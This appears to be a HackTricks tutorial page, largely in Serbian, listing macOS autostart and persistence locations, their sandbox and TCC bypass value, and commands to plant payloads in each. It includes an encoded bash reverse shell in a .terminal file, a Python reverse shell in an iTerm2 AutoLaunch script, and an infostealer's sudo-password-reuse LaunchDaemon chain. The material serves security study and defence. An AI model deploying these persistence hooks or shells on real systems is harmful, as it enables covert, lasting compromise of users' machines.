# macOS Automatsko pokretanje

{{#include ../banners/hacktricks-training.md}}

Ovaj odeljak je zasnovan na blog serijalu [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), cilj je dodati **više Autostart Locations** (ako je moguće), naznačiti **koje tehnike i dalje rade** danas sa najnovijom verzijom macOS-a (13.4) i precizirati **koje su dozvole** potrebne.

## Sandbox Bypass

> [!TIP]
> Ovde možete naći lokacije za start korisne za **sandbox bypass** koje vam omogućavaju da jednostavno izvršite nešto tako što ćete to **upisati u fajl** i **sačekati** vrlo **uobičajenu** **radnju**, određeno **vreme** ili **radnju koju obično možete izvesti** iz unutrašnjosti sandboks-a bez potrebe za root privilegijama.

### Launchd

- Korisno za sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

- **`/Library/LaunchAgents`**
- **Okidač**: ponovno pokretanje
- Potreban root
- **`/Library/LaunchDaemons`**
- **Okidač**: ponovno pokretanje
- Potreban root
- **`/System/Library/LaunchAgents`**
- **Okidač**: ponovno pokretanje
- Potreban root
- **`/System/Library/LaunchDaemons`**
- **Okidač**: ponovno pokretanje
- Potreban root
- **`~/Library/LaunchAgents`**
- **Okidač**: ponovna prijava
- **`~/Library/LaunchDemons`**
- **Okidač**: ponovna prijava

> [!TIP]
> Kao zanimljivost, **`launchd`** ima ugrađen property list u Mach-o sekciji `__Text.__config` koji sadrži druge dobro poznate servise koje launchd mora pokrenuti. Štaviše, ti servisi mogu sadržati `RequireSuccess`, `RequireRun` i `RebootOnSuccess` što znači da moraju biti pokrenuti i uspešno završeni.
>
> Naravno, ne može se modifikovati zbog code signing.

#### Opis i eksploatacija

**`launchd`** je **prvi** **proces** koji kernel OX S izvršava pri startu i poslednji koji se završava pri gašenju. Trebalo bi da uvek ima **PID 1**. Ovaj proces će **čitati i izvršavati** konfiguracije naznačene u **ASEP** **plists** u:

- `/Library/LaunchAgents`: Per-user agents instalirani od strane administratora
- `/Library/LaunchDaemons`: System-wide daemons instalirani od strane administratora
- `/System/Library/LaunchAgents`: Per-user agents koje obezbeđuje Apple
- `/System/Library/LaunchDaemons`: System-wide daemons koje obezbeđuje Apple

Kada se korisnik prijavi, plists koji se nalaze u `/Users/$USER/Library/LaunchAgents` i `/Users/$USER/Library/LaunchDemons` se pokreću sa **privilegijama prijavljenog korisnika**.

Glavna razlika između agents i daemons je u tome što se agents učitavaju kada se korisnik prijavi, dok se daemons učitavaju pri pokretanju sistema (postoje servisi poput ssh koji moraju biti izvršeni pre nego što bilo koji korisnik pristupi sistemu). Takođe, agents mogu koristiti GUI dok daemons moraju raditi u pozadini.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Postoje slučajevi kada **agent mora da se izvrši pre nego što se korisnik prijavi**, to se zove **PreLoginAgents**. Na primer, ovo je korisno za obezbeđivanje asistivne tehnologije pri prijavi. Takođe se mogu naći u `/Library/LaunchAgents` (pogledajte [**ovde**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) primer).

> [!TIP]
> Novi config fajlovi za Daemons ili Agents biće **učitani nakon sledećeg restartovanja ili korišćenjem** `launchctl load <target.plist>` . Takođe je **moguće učitati .plist fajlove bez te ekstenzije** pomoću `launchctl -F <file>` (međutim ti plist fajlovi neće biti automatski učitani nakon restartovanja).\
> Takođe je moguće **unload** pomoću `launchctl unload <target.plist>` (proces na koji ukazuje će biti terminiran),
>
> Da biste **osigurali** da ne postoji **ništa** (kao override) što **sprečava** **Agent** ili **Daemon** da **se pokrene**, pokrenite: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Prikažite sve agente i daemone koje je učitao trenutni korisnik:
```bash
launchctl list
```
#### Primer malicioznog LaunchDaemon lanca (ponovna upotreba lozinke)

Nedavni macOS infostealer ponovo je iskoristio **captured sudo password** da postavi user agent i root LaunchDaemon:

- Upisati agent loop u `~/.agent` i učiniti ga izvršnim.
- Generisati plist u `/tmp/starter` koji upućuje na tog agenta.
- Ponovo koristiti ukradenu lozinku sa `sudo -S` da se kopira u `/Library/LaunchDaemons/com.finder.helper.plist`, postavi `root:wheel` i učita pomoću `launchctl load`.
- Pokrenuti agenta tiho pomoću `nohup ~/.agent >/dev/null 2>&1 &` da bi se odvojio izlaz.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Ako je plist u vlasništvu korisnika, čak i ako se nalazi u sistemskim folderima za daemon-e, **task će biti izvršen kao taj korisnik** a ne kao root. Ovo može sprečiti neke napade za eskalaciju privilegija.

#### More info about launchd

**`launchd`** je **prvi** proces u korisničkom režimu koji se startuje iz **kernel**. Pokretanje procesa mora biti **uspešno** i on **ne sme da izađe ili da se sruši**. Čak je i **zaštićen** od nekih **killing signals**.

Jedna od prvih stvari koje `launchd` radi je da **pokrene** sve **daemons** kao što su:

- **Timer daemons** koji se izvršavaju na osnovu vremena:
- atd (`com.apple.atrun.plist`): Ima `StartInterval` od 30min
- crond (`com.apple.systemstats.daily.plist`): Ima `StartCalendarInterval` da počne u 00:15
- **Network daemons** kao:
- `org.cups.cups-lpd`: Sluša na TCP (`SockType: stream`) sa `SockServiceName: printer`
- SockServiceName mora biti ili port ili servis iz `/etc/services`
- `com.apple.xscertd.plist`: Sluša na TCP portu 1640
- **Path daemons** koji se izvršavaju kada se određeni path promeni:
- `com.apple.postfix.master`: Proverava path `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: U `MachServices` unosu navodi ime `com.apple.xscertd.helper`
- **UserEventAgent:**
- Ovo se razlikuje od prethodnog. On tera `launchd` da pokreće aplikacije kao odgovor na specifičan događaj. Međutim, u ovom slučaju glavni binarni fajl nije `launchd` već `/usr/libexec/UserEventAgent`. Učitava plugine iz SIP restricted folder-a `/System/Library/UserEventPlugins/` gde svaki plugin navodi svoj initialiser u ključu `XPCEventModuleInitializer` ili, u slučaju starijih plugina, u `CFPluginFactories` dict-u pod ključem `FB86416D-6164-2070-726F-70735C216EC0` u svom `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Ali treba da nađeš aplikaciju sa TCC bypass koja izvršava shell koji učitava ove fajlove

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Okidač**: Otvorite terminal sa zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Okidač**: Otvorite terminal sa zsh
- Zahteva root
- **`~/.zlogout`**
- **Okidač**: Izlazak iz terminala sa zsh
- **`/etc/zlogout`**
- **Okidač**: Izlazak iz terminala sa zsh
- Zahteva root
- Potencijalno više u: **`man zsh`**
- **`~/.bashrc`**
- **Okidač**: Otvorite terminal sa bash
- `/etc/profile` (nije radilo)
- `~/.profile` (nije radilo)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Okidač**: Očekivano da okine sa xterm, ali **nije instaliran** i čak i nakon instalacije javlja se greška: xterm: `DISPLAY is not set`

#### Description & Exploitation

Prilikom pokretanja shell okruženja kao što su `zsh` ili `bash`, **neki startup fajlovi se izvršavaju**. macOS trenutno koristi `/bin/zsh` kao podrazumevani shell. Ovaj shell se automatski koristi kada se pokrene aplikacija Terminal ili kada se uređaj pristupi preko SSH. Dok su `bash` i `sh` takođe prisutni u macOS-u, moraju biti izričito pozvani da bi se koristili.

Man stranica za zsh, koju možemo pročitati pomoću **`man zsh`**, sadrži dugi opis startup fajlova.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Ponovo otvorene aplikacije

> [!CAUTION]
> Konfigurisanje naznačenog exploitation i loging-out i loging-in ili čak rebootovanje nije uspelo da izvrši aplikaciju kod mene. (Aplikacija se nije pokretala, možda mora da bude pokrenuta dok se ove radnje izvode)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Koristan za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Restart — ponovno otvaranje aplikacija

#### Opis & Exploitation

Sve aplikacije koje će se ponovo otvoriti nalaze se u plist-u `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Dakle, naterajte aplikacije koje se ponovo otvaraju da pokrenu vašu aplikaciju — samo treba da **dodate svoju aplikaciju na listu**.

UUID se može naći listanjem tog direktorijuma ili komandom `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Da biste proverili aplikacije koje će biti ponovo otvorene, možete:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Da biste **dodali aplikaciju na ovu listu** možete koristiti:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal podešavanja

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal obično ima FDA dozvole korisnika koji ga pokreće

#### Lokacija

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Okidač**: Otvaranje Terminala

#### Opis i Eksploatacija

U **`~/Library/Preferences`** se čuvaju preference korisnika za aplikacije. Neke od tih preferenci mogu sadržati konfiguraciju za **pokretanje drugih aplikacija/skripti**.

Na primer, Terminal može izvršiti komandu pri pokretanju:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ova konfiguracija se beleži u fajlu **`~/Library/Preferences/com.apple.Terminal.plist`** na sledeći način:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Dakle, ako bi plist preferencija terminala u sistemu mogao biti prepisan, funkcionalnost **`open`** može se iskoristiti da otvori terminal i ta komanda će biti izvršena.

Ovo možete dodati iz cli pomoću:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal skripte / Ostale ekstenzije fajlova

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal će imati FDA dozvole korisnika koji ga pokrene

#### Lokacija

- **Bilo gde**
- **Okidač**: Otvaranje Terminala

#### Opis i eksploatacija

Ako napravite [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) i otvorite ga, **aplikacija Terminal** će biti automatski pokrenuta da izvrši komande koje su u njemu. Ako aplikacija Terminal ima neke posebne privilegije (kao što je TCC), vaše komande će biti izvršene sa tim privilegijama.

Isprobajte sa:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> Ako Terminal ima **Full Disk Access**, moći će da izvrši tu akciju (imajte na umu da će komanda koja se izvršava biti vidljiva u Terminal prozoru).

### Audio plugini

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Korisno za zaobilaženje sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Možda ćete dobiti dodatni TCC pristup

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Zahteva root
- **Trigger**: Ponovo pokrenuti coreaudiod ili računar
- **`/Library/Audio/Plug-ins/Components`**
- Zahteva root
- **Trigger**: Ponovo pokrenuti coreaudiod ili računar
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Ponovo pokrenuti coreaudiod ili računar
- **`/System/Library/Components`**
- Zahteva root
- **Trigger**: Ponovo pokrenuti coreaudiod ili računar

#### Description

Prema prethodnim writeup-ovima moguće je **kompajlirati neke audio plugine** i učitati ih.

### QuickLook plugini

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Korisno za zaobilaženje sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Možda ćete dobiti dodatni TCC pristup

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugini mogu biti izvršeni kada pokrenete pregled fajla (pritisnite razmak dok je fajl selektovan u Finder) i kada je instaliran **plugin koji podržava taj tip fajla**.

Moguće je kompajlirati svoj QuickLook plugin, postaviti ga u jednu od prethodnih lokacija da bi se učitao, a zatim otići do podržanog fajla i pritisnuti razmak da ga pokrenete.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Ovo nije radilo kod mene, ni sa korisničkim LoginHook niti sa root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Korisno za zaobilaženje sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Potrebno je da možete izvršiti nešto kao `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Locirano u `~/Library/Preferences/com.apple.loginwindow.plist`

Oni su zastareli, ali se mogu koristiti za izvršavanje komandi kada se korisnik prijavi.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Ovo podešavanje je sačuvano u `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Da biste ga obrisali:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Datoteka za root korisnika je smeštena u **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Uslovni Sandbox Bypass

> [!TIP]
> Ovde možete naći start lokacije korisne za **sandbox bypass** koje vam omogućavaju da jednostavno izvršite nešto tako što ćete ga **upisati u fajl** i **oslanjati se na ne baš uobičajene uslove** kao što su specifični **instalirani programi, "neobične" korisničke** radnje ili okruženja.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Korisno za sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Međutim, morate moći da izvršite binarnu datoteku `crontab`
- Ili biti root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root je potreban za direktan pristup za pisanje. Root nije potreban ako možete izvršiti `crontab <file>`
- **Trigger**: Zavisi od cron job-a

#### Opis & Eksploatacija

Prikažite cron jobove **trenutnog korisnika** pomoću:
```bash
crontab -l
```
Takođe možeš videti sve cron jobs korisnika u **`/usr/lib/cron/tabs/`** i **`/var/at/tabs/`** (zahteva root).

U MacOS možeš naći nekoliko foldera koji izvršavaju scripts sa **određenom frekvencijom**:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Tu možete pronaći uobičajene **cron** **jobs**, **at** **jobs** (retko korišćene) i **periodic** **jobs** (uglavnom korišćene za čišćenje privremenih fajlova). Dnevne **periodic** poslove, na primer, možete pokrenuti pomoću: `periodic daily`.

Da biste dodali **user cronjob programatically**, možete koristiti:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Analiza: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Korisno za bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 je ranije imao dodeljena TCC dopuštenja

#### Lokacije

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Okidač**: Otvaranje iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Okidač**: Otvaranje iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Okidač**: Otvaranje iTerm

#### Opis i eksploatacija

Skripti smešteni u **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** biće izvršeni. Na primer:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
ili:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Skripta **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** će takođe biti izvršena:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Preferencije iTerm2 koje se nalaze u **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogu **navesti komandu za izvršavanje** kada se iTerm2 terminal otvori.

Ovo podešavanje se može podesiti u iTerm2 podešavanjima:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

A komanda je prikazana u preferencijama:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Možete podesiti komandu koja će se izvršiti pomoću:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Veoma je verovatno da postoje **drugi načini za zloupotrebu iTerm2 podešavanja** za izvršavanje proizvoljnih komandi.

### xbar

Detaljan opis: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Ali xbar mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Zahteva dozvole za Accessibility

#### Lokacija

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Okidač**: Kada se xbar pokrene

#### Opis

Ako je popularni program [**xbar**](https://github.com/matryer/xbar) instaliran, moguće je napisati shell skriptu u **`~/Library/Application\ Support/xbar/plugins/`** koja će biti izvršena kada se xbar pokrene:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Koristan za bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ali Hammerspoon mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Zahteva Accessibility dozvole

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Kada se hammerspoon pokrene

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) služi kao platforma za automatizaciju za **macOS**, koristeći **LUA scripting language** za svoje operacije. Posebno podržava integraciju kompletnog AppleScript koda i izvršavanje shell scripts, značajno unapređujući njegove scripting mogućnosti.

Aplikacija traži datoteku `~/.hammerspoon/init.lua`, i pri pokretanju će skripta iz te datoteke biti izvršena.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ali BetterTouchTool mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Zahteva Automation-Shortcuts i Accessibility dozvole

#### Lokacija

- `~/Library/Application Support/BetterTouchTool/*`

Ovaj alat omogućava da se navedu aplikacije ili skripte koje će se izvršavati kada se pritisnu određeni shortcuts. Napadač bi mogao da konfiguriše sopstveni **shortcut i akciju za izvršenje u bazi podataka** kako bi naterao izvršenje proizvoljnog koda (shortcut može biti i samo pritisak tastera).

### Alfred

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ali Alfred mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Zahteva Automation, Accessibility pa čak i Full-Disk access dozvole

#### Lokacija

- `???`

Omogućava kreiranje workflows koji mogu izvršavati kod kada su ispunjeni određeni uslovi. Potencijalno je moguće da napadač kreira workflow fajl i natera Alfred da ga učita (potrebno je platiti premium verziju da bi se koristili workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ali ssh mora biti omogućen i korišćen
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH je nekada imao FDA pristup

#### Lokacija

- **`~/.ssh/rc`**
- **Okidač**: Prijava putem ssh
- **`/etc/ssh/sshrc`**
- Zahteva root
- **Okidač**: Prijava putem ssh

> [!CAUTION]
> Za uključivanje ssh potrebna je Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Opis i eksploatacija

Po defaultu, osim ako nije `PermitUserRC no` u `/etc/ssh/sshd_config`, kada se korisnik **prijavi putem SSH-a** skripte **`/etc/ssh/sshrc`** i **`~/.ssh/rc`** će biti izvršene.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ali je potrebno izvršiti `osascript` sa argumentima
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Okidač:** Login
- Eksploit payload je smešten pozivajući **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Okidač:** Login
- Zahteva root

#### Opis

U System Preferences -> Users & Groups -> **Login Items** možete pronaći **stavke koje se izvršavaju kada se korisnik prijavi**.\
Moguće ih je navesti, dodati i ukloniti iz komandne linije:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Ove stavke su sačuvane u fajlu **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** takođe mogu biti označene korišćenjem API-ja [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) koji će sačuvati konfiguraciju u **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP kao Login Item

(Pogledajte prethodni odeljak o Login Items, ovo je proširenje)

Ako sačuvate **ZIP** fajl kao **Login Item**, **`Archive Utility`** će ga otvoriti i ako je zip, na primer, bio sačuvan u **`~/Library`** i sadržavao direktorijum **`LaunchAgents/file.plist`** sa backdoor-om, taj direktorijum će biti kreiran (nije podrazumevano kreiran) i plist će biti dodat, tako da će se sledeći put kada se korisnik ponovo prijavi, izvršiti **backdoor označen u plist-u**.

Druga opcija je kreirati fajlove **`.bash_profile`** i **`.zshenv`** u korisničkom HOME direktorijumu, tako da, ako direktorijum LaunchAgents već postoji, ova tehnika i dalje funkcioniše.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Međutim, potrebno je **pokrenuti** **`at`** i on mora biti **omogućen**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Potrebno je **pokrenuti** **`at`** i on mora biti **omogućen**

#### **Opis**

`at` tasks are designed for **scheduling one-time tasks** to be executed at certain times. Unlike cron jobs, `at` tasks are automatically removed post-execution. It's crucial to note that these tasks are persistent across system reboots, marking them as potential security concerns under certain conditions.

Po **defaultu** oni su **onemogućeni**, ali korisnik **root** može da ih **omogući** pomoću:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Ovo će kreirati datoteku za 1 sat:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Proverite red zadataka koristeći `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Iznad možemo videti dva zakazana zadatka. Detalje zadatka možemo ispisati koristeći `at -c JOBNUMBER`.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
